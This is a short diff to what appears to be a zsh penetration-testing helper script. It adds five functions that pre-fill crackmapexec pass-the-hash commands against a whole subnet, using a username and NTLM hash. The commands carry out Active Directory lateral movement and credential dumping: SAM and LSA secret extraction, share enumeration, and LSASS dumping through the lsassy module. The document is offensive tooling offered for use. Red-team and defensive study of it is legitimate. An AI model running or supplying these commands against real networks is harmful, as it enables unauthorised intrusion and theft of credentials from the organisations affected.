@@ -45,28 +45,33 @@ nb-ad-pth-exploit() {
     __check-project
     nb-vars-set-network
 
+	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth"
 }
 
 nb-ad-pth-sam() {
     __check-project
     nb-vars-set-network
 
+	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --sam"
 }
 
 nb-ad-pth-enum() {
     __check-project
     nb-vars-set-network
 
+	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --shares"
 }
 
 nb-ad-pth-lsa() {
     __check-project
     nb-vars-set-network
 
+	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --lsa"
 }
 
 nb-ad-pth-lsassy() {
     __check-project
     nb-vars-set-network
 
+	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth -M lsassy"
 }
